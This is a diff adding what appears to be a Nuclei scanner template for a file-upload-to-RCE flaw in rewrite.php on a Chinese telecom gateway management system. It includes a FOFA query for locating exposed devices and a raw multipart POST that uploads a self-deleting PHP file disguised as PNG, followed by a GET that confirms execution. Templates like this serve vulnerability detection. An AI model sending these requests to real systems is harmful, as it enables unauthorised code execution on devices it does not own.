@@ -1,0 +1,50 @@
+id: dx-gateway-config-manage-fileupload
+
+info:
+  name: 电信网关配置管理系统 rewrite.php 文件上传致RCE
+  author: onewin
+  severity: critical
+  description: 电信网关配置管理系统 rewrite.php 文件上传致RCE
+  metadata:
+    verified: true
+    max-request: 2
+    fofa-query: body="img/login_bg3.png" && body="系统登录"
+  tags: fileupload,iot,,intrusive
+variables:
+  filename: '{{rand_base(6)}}'
+  payload: '{{rand_base(32)}}'
+
+http:
+- raw:
+  - |
+    @timeout: 30s
+    POST /manager/teletext/material/rewrite.php HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
+    Connection: close
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOKldnDPT
+    Content-Length: 305
+
+    ------WebKitFormBoundaryOKldnDPT
+    Content-Disposition: form-data; name="tmp_name"; filename="{{filename}}.php"
+    Content-Type: image/png
+
+    <?php echo"{{payload}}";unlink(__FILE__);?>
+    ------WebKitFormBoundaryOKldnDPT
+    Content-Disposition: form-data; name="uploadtime"
+
+
+    ------WebKitFormBoundaryOKldnDPT--
+  - |
+    GET /xmedia/material/{{filename}}.php HTTP/1.1
+    Host: {{Hostname}}
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_2 == 200'
+          - 'contains(body_2, "{{payload}}")'
+        condition: and
+
